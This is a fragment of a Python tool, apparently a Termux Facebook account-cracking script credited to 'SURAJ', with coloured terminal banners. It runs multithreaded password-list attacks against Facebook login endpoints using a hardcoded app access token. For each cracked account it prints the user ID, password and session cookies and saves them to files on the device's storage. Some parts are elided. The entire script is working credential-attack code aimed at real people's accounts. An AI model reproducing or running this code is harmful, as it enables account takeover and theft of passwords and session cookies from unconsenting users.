...
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mOWONER     \x1b[1;97m● \033[38;5;46mSURAJ
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mFacebook   \x1b[1;97m● \033[38;5;46mSURAJ
...
def file():
    ...
    with tred(max_workers=30) as SURAJ:
        fresh()
        tl = str(len(fo))
        ...
        for user in fo:
            ...
            passlist = plist
            if Toxic_x =='1':
                SURAJ.submit(api1,ids,names,passlist)
            if Toxic_x =='2':
                SURAJ.submit(api2,ids,names,passlist)
            if Toxic_x =='3':
                SURAJ.submit(api3,ids,names,passlist)
#-----------------------[ FILE-METHOD-CODE ]-----------------------#
...
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r{w} \x1b[38;5;196m[\x1b[38;5;46mSURAJ\x1b[1;97m-\x1b[38;5;146mXD\x1b[38;5;196m] [{loop}] [{len(ok)}|{len(cp)}]');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ...
                        if 'session_key' in po:
                                ...
                                try:
                                    ...
                                    if 'Photoshop' in res:
                                        print(f'\r{g} \x1b[38;5;196m[\x1b[38;5;46mSURAJ\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m {str(uid)} \x1b[1;97m● \x1b[38;5;46m{pas} ')
                                        coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                        if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
                                        open('/sdcard/SURAJ-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        ok.append(str(uid))
                                        break
                                    else:break
                                except:break
                                ...
                                open('/sdcard/SURAJ-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
